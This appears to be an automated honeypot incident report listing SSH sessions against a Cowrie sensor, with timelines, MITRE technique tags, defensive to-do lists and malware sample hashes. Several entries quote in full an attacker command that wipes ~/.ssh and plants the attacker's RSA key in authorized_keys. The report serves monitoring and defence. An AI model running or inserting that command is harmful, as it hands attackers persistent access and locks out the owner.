| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:40:35` | `cowrie.session.connect` |
| `2026-07-14 18:40:35` | `cowrie.client.version` |
| `2026-07-14 18:40:35` | `cowrie.client.kex` |
| `2026-07-14 18:40:35` | `cowrie.login.success` |
| `2026-07-14 18:40:36` | `cowrie.session.params` |
| `2026-07-14 18:40:36` | `cowrie.command.input` |
| `2026-07-14 18:40:36` | `cowrie.command.failed` |
| `2026-07-14 18:40:36` | `cowrie.log.closed` |
| `2026-07-14 18:40:37` | `cowrie.session.params` |
| `2026-07-14 18:40:37` | `cowrie.command.input` |
| `2026-07-14 18:40:37` | `cowrie.session.file_download` |
| `2026-07-14 18:40:37` | `cowrie.log.closed` |
| `2026-07-14 18:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `107.150.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9baff7083e51

| Field | Detail |
|---|---|
| **Source IP** | `107.150.110[.]217` |
| **First Seen** | 2026-07-14 18:40 |
| **Last Seen** | 2026-07-14 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:40:37` | `cowrie.session.connect` |
| `2026-07-14 18:40:37` | `cowrie.client.version` |
| `2026-07-14 18:40:37` | `cowrie.client.kex` |
| `2026-07-14 18:40:37` | `cowrie.login.success` |
| `2026-07-14 18:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `107.150.110[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e877515752

| Field | Detail |
|---|---|
| **Source IP** | `107.150.110[.]217` |
| **First Seen** | 2026-07-14 18:40 |
| **Last Seen** | 2026-07-14 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:40:37` | `cowrie.session.connect` |
| `2026-07-14 18:40:37` | `cowrie.client.version` |
| `2026-07-14 18:40:37` | `cowrie.client.kex` |
| `2026-07-14 18:40:38` | `cowrie.login.success` |
| `2026-07-14 18:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `107.150.110[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83554021aceb

| Field | Detail |
|---|---|
| **Source IP** | `118.123.116[.]93` |
| **First Seen** | 2026-07-14 18:42 |
| **Last Seen** | 2026-07-14 18:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:42:50` | `cowrie.session.connect` |
| `2026-07-14 18:42:51` | `cowrie.client.version` |
| `2026-07-14 18:42:51` | `cowrie.client.kex` |
| `2026-07-14 18:42:53` | `cowrie.login.success` |
| `2026-07-14 18:42:54` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.123.116[.]93` to AbuseIPDB if not already reported
- [ ] Block `118.123.116[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7989aaf279cd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-07-14 18:43 |
| **Last Seen** | 2026-07-14 18:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:43:04` | `cowrie.session.connect` |
| `2026-07-14 18:43:04` | `cowrie.client.version` |
| `2026-07-14 18:43:04` | `cowrie.client.kex` |
| `2026-07-14 18:43:06` | `cowrie.login.success` |
| `2026-07-14 18:43:07` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f987f57f62

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-14 18:43 |
| **Last Seen** | 2026-07-14 18:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:43:36` | `cowrie.session.connect` |
| `2026-07-14 18:43:37` | `cowrie.client.version` |
| `2026-07-14 18:43:37` | `cowrie.client.kex` |
| `2026-07-14 18:43:39` | `cowrie.login.success` |
| `2026-07-14 18:43:40` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a046410ac21

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-07-14 18:44 |
| **Last Seen** | 2026-07-14 18:49 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:44:35` | `cowrie.session.connect` |
| `2026-07-14 18:44:36` | `cowrie.client.version` |
| `2026-07-14 18:44:36` | `cowrie.client.kex` |
| `2026-07-14 18:44:38` | `cowrie.login.success` |
| `2026-07-14 18:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7367bf8eb15d

| Field | Detail |
|---|---|
| **Source IP** | `220.189.218[.]126` |
| **First Seen** | 2026-07-14 18:44 |
| **Last Seen** | 2026-07-14 18:45 |
| **Session Duration** | 72s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:44:46` | `cowrie.session.connect` |
| `2026-07-14 18:44:46` | `cowrie.client.version` |
| `2026-07-14 18:44:46` | `cowrie.client.kex` |
| `2026-07-14 18:44:47` | `cowrie.login.success` |
| `2026-07-14 18:45:58` | `cowrie.session.file_upload` |
| `2026-07-14 18:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.218[.]126` to AbuseIPDB if not already reported
- [ ] Block `220.189.218[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a9b1a813d5

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-07-14 18:45 |
| **Last Seen** | 2026-07-14 18:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:45:51` | `cowrie.session.connect` |
| `2026-07-14 18:45:51` | `cowrie.client.version` |
| `2026-07-14 18:45:51` | `cowrie.client.kex` |
| `2026-07-14 18:45:52` | `cowrie.login.success` |
| `2026-07-14 18:45:53` | `cowrie.session.params` |
| `2026-07-14 18:45:53` | `cowrie.command.input` |
| `2026-07-14 18:45:53` | `cowrie.command.failed` |
| `2026-07-14 18:45:54` | `cowrie.log.closed` |
| `2026-07-14 18:45:55` | `cowrie.session.params` |
| `2026-07-14 18:45:55` | `cowrie.command.input` |
| `2026-07-14 18:45:55` | `cowrie.session.file_download` |
| `2026-07-14 18:45:55` | `cowrie.log.closed` |
| `2026-07-14 18:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e90db3d4d2

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-07-14 18:45 |
| **Last Seen** | 2026-07-14 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:45:55` | `cowrie.session.connect` |
| `2026-07-14 18:45:55` | `cowrie.client.version` |
| `2026-07-14 18:45:56` | `cowrie.client.kex` |
| `2026-07-14 18:45:57` | `cowrie.login.success` |
| `2026-07-14 18:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8a877837e0

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-07-14 18:45 |
| **Last Seen** | 2026-07-14 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:45:57` | `cowrie.session.connect` |
| `2026-07-14 18:45:57` | `cowrie.client.version` |
| `2026-07-14 18:45:58` | `cowrie.client.kex` |
| `2026-07-14 18:45:59` | `cowrie.login.success` |
| `2026-07-14 18:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1a25343668

| Field | Detail |
|---|---|
| **Source IP** | `103.23.135[.]183` |
| **First Seen** | 2026-07-14 18:48 |
| **Last Seen** | 2026-07-14 18:48 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:48:11` | `cowrie.session.connect` |
| `2026-07-14 18:48:11` | `cowrie.client.version` |
| `2026-07-14 18:48:11` | `cowrie.client.kex` |
| `2026-07-14 18:48:14` | `cowrie.login.success` |
| `2026-07-14 18:48:15` | `cowrie.session.params` |
| `2026-07-14 18:48:15` | `cowrie.command.input` |
| `2026-07-14 18:48:15` | `cowrie.command.failed` |
| `2026-07-14 18:48:17` | `cowrie.log.closed` |
| `2026-07-14 18:48:18` | `cowrie.session.params` |
| `2026-07-14 18:48:18` | `cowrie.command.input` |
| `2026-07-14 18:48:18` | `cowrie.session.file_download` |
| `2026-07-14 18:48:18` | `cowrie.log.closed` |
| `2026-07-14 18:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.135[.]183` to AbuseIPDB if not already reported
- [ ] Block `103.23.135[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f725bc38a920

| Field | Detail |
|---|---|
| **Source IP** | `103.23.135[.]183` |
| **First Seen** | 2026-07-14 18:48 |
| **Last Seen** | 2026-07-14 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:48:18` | `cowrie.session.connect` |
| `2026-07-14 18:48:18` | `cowrie.client.version` |
| `2026-07-14 18:48:19` | `cowrie.client.kex` |
| `2026-07-14 18:48:22` | `cowrie.login.success` |
| `2026-07-14 18:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.135[.]183` to AbuseIPDB if not already reported
- [ ] Block `103.23.135[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ae075c0e79

| Field | Detail |
|---|---|
| **Source IP** | `103.23.135[.]183` |
| **First Seen** | 2026-07-14 18:48 |
| **Last Seen** | 2026-07-14 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:48:23` | `cowrie.session.connect` |
| `2026-07-14 18:48:23` | `cowrie.client.version` |
| `2026-07-14 18:48:23` | `cowrie.client.kex` |
| `2026-07-14 18:48:26` | `cowrie.login.success` |
| `2026-07-14 18:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.135[.]183` to AbuseIPDB if not already reported
- [ ] Block `103.23.135[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4bf48f5408

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-07-14 18:50 |
| **Last Seen** | 2026-07-14 18:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:50:23` | `cowrie.session.connect` |
| `2026-07-14 18:50:23` | `cowrie.client.version` |
| `2026-07-14 18:50:23` | `cowrie.client.kex` |
| `2026-07-14 18:50:24` | `cowrie.login.success` |
| `2026-07-14 18:50:26` | `cowrie.session.params` |
| `2026-07-14 18:50:26` | `cowrie.command.input` |
| `2026-07-14 18:50:26` | `cowrie.command.failed` |
| `2026-07-14 18:50:26` | `cowrie.log.closed` |
| `2026-07-14 18:50:27` | `cowrie.session.params` |
| `2026-07-14 18:50:27` | `cowrie.command.input` |
| `2026-07-14 18:50:27` | `cowrie.session.file_download` |
| `2026-07-14 18:50:27` | `cowrie.log.closed` |
| `2026-07-14 18:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f835e967b2

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-07-14 18:50 |
| **Last Seen** | 2026-07-14 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:50:27` | `cowrie.session.connect` |
| `2026-07-14 18:50:27` | `cowrie.client.version` |
| `2026-07-14 18:50:27` | `cowrie.client.kex` |
| `2026-07-14 18:50:28` | `cowrie.login.success` |
| `2026-07-14 18:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1de9da07d88

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-07-14 18:50 |
| **Last Seen** | 2026-07-14 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:50:29` | `cowrie.session.connect` |
| `2026-07-14 18:50:29` | `cowrie.client.version` |
| `2026-07-14 18:50:29` | `cowrie.client.kex` |
| `2026-07-14 18:50:30` | `cowrie.login.success` |
| `2026-07-14 18:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.233[.]61` | **31** | 2026-07-14 16:55 | 2026-07-14 18:54 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **10** | 2026-07-14 17:03 | 2026-07-14 18:46 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-14 16:55 | 2026-07-14 18:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-14 18:13 | 2026-07-14 18:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.220.202[.]165` | **2** | 2026-07-14 17:12 | 2026-07-14 17:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]40` | **2** | 2026-07-14 17:12 | 2026-07-14 17:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.29.185[.]162` | 1 | 2026-07-14 18:14 | 2026-07-14 18:14 | 7s | 0 | `T1592` | 🟢 LOW |
| `107.173.127[.]185` | 1 | 2026-07-14 17:59 | 2026-07-14 17:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.160.173[.]22` | 1 | 2026-07-14 17:28 | 2026-07-14 17:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.174.82[.]178` | 1 | 2026-07-14 18:48 | 2026-07-14 18:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-07-14 18:44 | 2026-07-14 18:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-07-14 18:51 | 2026-07-14 18:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | 1 | 2026-07-14 18:15 | 2026-07-14 18:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-14 17:20 | 2026-07-14 17:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-14 18:18 | 2026-07-14 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]185` | 1 | 2026-07-14 18:53 | 2026-07-14 18:53 | 17s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
